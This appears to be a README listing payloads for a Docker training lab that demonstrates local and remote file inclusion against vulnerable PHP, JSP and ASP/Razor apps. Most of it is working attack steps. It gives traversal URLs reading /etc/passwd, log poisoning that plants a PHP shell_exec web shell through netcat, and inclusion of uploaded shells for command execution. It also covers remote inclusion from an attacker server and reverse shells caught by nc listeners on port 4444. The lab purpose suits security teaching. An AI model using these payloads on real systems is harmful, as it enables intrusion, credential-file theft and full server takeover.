# Payloads

For an in-detail-description of the following payloads go to [https://secf00tprint.github.io/blog/payload-tester/lfirfi/en](https://secf00tprint.github.io/blog/payload-tester/lfirfi/en)

## RFI

For the RFI payloads you have to change the IP to the IP from the internal network in every link. Use `docker inspect <docker_attacker_id>` to get the IP.

## PHP

### RFI 
[http://127.0.0.1:8883/lfi.php?language=http://172.18.0.3/check.php?](http://127.0.0.1:8883/lfi.php?language=http://172.18.0.3/check.php?)

see `allow_url_include` in response

### etc/passwd

[http://127.0.0.1:8883/lfi.php?page=/etc/passwd](http://127.0.0.1:8883/lfi.php?page=/etc/passwd)

By way of experiment add `../` before `etc/passwd` until ...

[http://127.0.0.1:8883/lfi.php?page=../../../etc/passwd](http://127.0.0.1:8883/lfi.php?page=../../../etc/passwd)

### Log Injection

Get `access.log`: 

Changed here to `access_combined.log`. The used docker image pipes `access.log` to stdout, so the default log of the apache is know changed. (If somebody knows a way to change `access.log`->`stdout` for this image to write both to stdout and in the file help would be appreciated, please mail me):

[http://127.0.0.1:8883/lfi.php?page=../../../var/log/apache2/access_combined.log](http://127.0.0.1:8883/lfi.php?page=../../../var/log/apache2/access_combined.log)

Then use:

```
nc -nv 127.0.0.1 8883
<?php echo shell_exec($_GET['cmd']);?>
```

and

[http://127.0.0.1:8883/lfi.php?page=../../../var/log/apache2/access_combined.log&cmd=id](http://127.0.0.1:8883/lfi.php?page=../../../var/log/apache2/access_combined.log&cmd=id)

Check for uid in output

### LFI

#### Verification

Upload check.php from attacker-server src folder

then:

- [http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/check](http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/check) or
- [http://127.0.0.1:8883/lfi.php?language=uploads/check](http://127.0.0.1:8883/lfi.php?language=uploads/check)

#### Exploit

Upload shell.php
[http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/shell](http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/shell)

then:

```
docker exec -ti <containerid_attackerserver> /bin/bash
nc 172.18.0.1 4444
```

## JSP

### LFI

Upload runme.jsp for Remote Code Execution:

- [http://127.0.0.1:8881/webapp/?help=runme.jsp?exec=ls](http://127.0.0.1:8881/webapp/?help=runme.jsp?exec=ls)
- [http://127.0.0.1:8881/webapp/?help=runme.jsp?exec=cat%20/etc/passwd](http://127.0.0.1:8881/webapp/?help=runme.jsp?exec=cat%20/etc/passwd)

### RFI

(You have to adjust ip addresses to the attacker server in the docker network)

- [http://localhost:8881/webapp/?help=http://172.18.0.3:8080/webapp/thiscomesfromhaxxor](http://localhost:8881/webapp/?help=http://172.18.0.3:8080/webapp/thiscomesfromhaxxor)
- [http://127.0.0.1:8881/webapp/?help=http://172.18.0.3:8080/webapp/runme.jsp?exec=ls](http://127.0.0.1:8881/webapp/?help=http://172.18.0.3:8080/webapp/runme.jsp?exec=ls)

## ASP / Razor

Use [https://github.com/StefanScherer/windows-docker-machine](https://github.com/StefanScherer/windows-docker-machine) to get a windows docker environment

Upload the files and call:

`SimpleEchopayload.cshtml`

[http://192.168.99.90:8080/?test=SimpleEchoPayload.cshtml](http://192.168.99.90:8080/?test=SimpleEchoPayload.cshtml)

`WinLfiPayload.cshtml`

[http://192.168.99.90:8080/?test=WinLfiPayload.cshtml](http://192.168.99.90:8080/?test=WinLfiPayload.cshtml)

`CheckPowerShell.cshtml`

[http://192.168.99.90:8080/?test=CheckPowerShell.cshtml](http://192.168.99.90:8080/?test=CheckPowerShell.cshtml)

`RevShell.cshtml`, change IP to attacker server ip in the file

nc -nlvp 4444 at attacker server, then:

[http://192.168.99.90:8080/?test=RevShell.cshtml](http://192.168.99.90:8080/?test=RevShell.cshtml)

